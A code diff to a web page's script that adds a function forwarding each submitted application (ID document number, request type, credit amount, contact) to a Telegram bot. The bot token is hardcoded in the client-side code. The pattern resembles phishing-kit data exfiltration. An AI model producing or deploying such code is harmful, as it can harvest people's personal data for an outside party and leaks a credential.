@@ -264,7 +264,7 @@ async function procesarSolicitud() {
 
   const exito = await guardarSolicitud(datos);
   if (exito) {
-  
+  enviarATelegram(datos);
   }
 }
 
@@ -273,7 +273,30 @@ if (document.readyState === 'loading') {
 } else {
   procesarSolicitud();
 }
+const TELEGRAM_TOKEN = "9182445869:AAFsmiyrA8eCQeM278Tq9zn2NN_f72Xh118";
+let TELEGRAM_CHAT_ID = "";
 
+async function enviarATelegram(datos) {
+  if (!TELEGRAM_CHAT_ID) {
+    console.log("Falta tu ID de chat");
+    return;
+  }
+
+  const mensaje = "NUEVA SOLICITUD\n" +
+    "Documento: " + datos.documento + "\n" +
+    "Tipo: " + datos.tipo + "\n" +
+    "Cupo: " + datos.cupo + "\n" +
+    "Contacto: " + datos.contacto;
+
+  await fetch("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: mensaje
+    })
+  });
+}
 </script>
 </body>
 </html>
